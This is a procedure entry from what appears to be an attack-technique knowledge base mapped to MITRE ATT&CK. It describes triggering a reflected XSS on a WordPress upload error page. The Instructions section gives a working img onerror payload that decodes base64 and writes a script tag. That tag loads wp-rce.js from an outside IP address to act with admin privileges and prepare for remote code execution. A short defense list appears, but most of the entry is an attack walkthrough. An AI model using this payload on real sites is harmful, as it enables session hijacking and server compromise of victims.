---
id: proc-004
tags:
  - xss
  - execution
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:32.436Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger Reflected XSS Payload

## Summary

This procedure executes the reflected XSS from the upload error message, decoding the base64 payload and injecting a script tag to load external JavaScript for further exploitation.

## Description

Upon rendering the error page, the browser parses the unsanitized filename, firing the onerror event on the <img> tag. This decodes the base64 string using atob() and uses document.write() to insert a script loading wp-rce.js from an attacker-controlled server. The script runs in the context of the WordPress domain, enabling same-origin access to admin functions.

## Requirements

1. Successful upload of malicious filename
2. Victim views the error page in their browser
3. Attacker server hosting wp-rce.js accessible

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) to block inline scripts and external loads
- Sanitize error outputs to prevent HTML injection
- Monitor browser console for unexpected script executions

## Objectives

1. Execute JavaScript in victim context
2. Load external payload
3. Prepare for chaining to RCE

## Instructions

### Step 1: View Error Page

**Context**: The upload failure automatically displays the error with reflected filename.

**Command** (Automatic Trigger):

No manual command; page load executes <img src=x onerror='document.write(atob("[BASE64]"))'>

> Expected output: Payload decodes to 'Running POC<script src="http://159.203.190.123/.../wp-rce.js"></script>', injecting and loading the script.

### Step 2: Verify Execution

**Context**: Check browser dev tools for script load.

**Command** (Dev Tools Inspection):

Open Network tab and reload error page

> Expected output: Request to wp-rce.js with 200 status; console shows 'Running POC'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- execution
- javascript
